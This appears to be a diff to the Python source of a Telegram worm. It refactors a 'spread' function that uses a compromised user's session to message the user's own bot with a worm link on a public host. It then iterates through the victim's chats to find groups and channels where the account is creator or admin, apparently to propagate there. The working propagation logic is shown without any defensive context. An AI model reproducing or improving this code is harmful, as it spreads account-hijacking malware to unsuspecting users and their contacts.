@@ -77,37 +77,29 @@ async def backup_saves(client, me, logger_bot):
     return log
 async def spread(client, me, botinfo, log):
     spread_msg = None
+    worm_url = os.environ['PUBLIC_HOST']+("".join(random.choice(string.ascii_letters+string.digits) for i in range(16)))
     spread_msg_nomedia = f"{strings['worm_msg']}\n\n{worm_url}"
     if botinfo is not None:
-        async with TelegramClient(StringSession(), 6, 'eb06d4abfb49dc3eeb1aeb98ae0f581e') as bot:
-            await bot.start(bot_token=botinfo['token'])
-            worm_url = os.environ['PUBLIC_HOST']+("".join(random.choice(string.ascii_letters+string.digits) for i in range(16)))
-            async with client.conversation(f"@{botinfo['username']}") as conv:
-                msg = await conv.send_message("/start")
-                await bot.send_message(
-                    me.id,
-                    strings['worm_msg'],
-                    file='files/worm.png',
-                    buttons=[[Button.url(strings['worm_msg_btn_txt'], worm_url)]],
-                    link_preview=False
-                )
-                spread_msg = await conv.get_response()
-            spread_msg_nomedia = f"{strings['worm_msg']}\n\n{worm_url}"
+        bot = TelegramClient(StringSession(), 6, 'eb06d4abfb49dc3eeb1aeb98ae0f581e')
+        await bot.start(bot_token=botinfo['token'])
+        async with client.conversation(f"@{botinfo['username']}") as conv:
+            msg = await conv.send_message("/start")
+            await bot.send_message(
+                me.id,
+                strings['worm_msg'],
+                file='files/worm.png',
+                buttons=[[Button.url(strings['worm_msg_btn_txt'], worm_url)]],
+                link_preview=False
+            )
+            spread_msg = await conv.get_response()
+        await bot.disconnect()
     perm_logs = {
         'creator': [],
         'admin': [],
     }
     async for dialog in client.iter_dialogs():
-        if dialog.is_user:
-            try:
-                user = await client.get_entity(dialog.id)
-            except errors.FloodWaitError as e:
-                await asyncio.sleep(e.seconds)
-                user = await client.get_entity(dialog.id)
-            except:
-                continue
-            if user.bot:
-                continue
+        if dialog.is_user and (dialog.entity.bot or dialog.entity.deleted):
+            continue
         elif dialog.is_channel or dialog.is_group:
             permissions = await client.get_permissions(dialog, me)
             if permissions.is_creator:
